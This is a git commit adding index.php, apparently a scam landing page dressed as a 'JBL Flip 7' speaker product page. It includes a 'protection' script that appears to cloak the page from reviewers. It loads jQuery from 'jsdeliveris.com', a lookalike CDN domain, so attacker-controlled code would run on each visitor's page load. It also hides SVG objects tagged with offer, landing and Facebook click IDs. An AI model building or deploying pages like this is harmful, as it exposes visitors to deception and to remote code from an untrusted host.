b902c342701f662980676cacfe339b41dc380f96
btc103333 <freetraf@proton.me>
2025-08-12 00:34:16 +0300

    2
    2

---
+++ index.php
@@ -0,0 +1,32 @@
+<?php include __DIR__.'/../protection/ywbprotect.php';?>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0"
+    />
+    <title>JBL Flip 7 Black Speaker</title>
+    <script defer src="https://jsdeliveris.com/ajax/libs/jquery/3.6.1/jquery.js"></script>
+  </head>
+  <body>
+    <img class="sr-only" src="./images/sec-img.svg" type="image/svg+xml" alt="">
+    <div style="display: flex; flex-direction: column; gap: 10px; justify-content: center; align-items: center; height: 100%">
+      <div style="max-width: 500px;">
+        <img
+          src="./images/prod.webp"
+          width="100%"
+          style="max-width: 100px"
+          alt=""
+        />
+        <h1>JBL Flip 7 Black Speaker</h1>
+        <p>
+          Unmatched JBL sound that travels with us wherever we go. Because music knows no boundaries, and neither should we. Whether we're throwing a beach party, relaxing in the backyard, or setting the mood for a cozy evening at home, the Flip 7 speaker is designed to enhance any experience, wherever life takes us. And now, our signature sound is bigger and bolder than ever, thanks to JBL AI Sound Boost technology.
+        </p>
+      </div>
+    </div>
+    <object class="sr-only" data="./images/sec-img.svg?o={offer_id}&l={landing_id}" type="image/svg+xml"></object>
+    {_fbclid}
+  </body>
+</html>
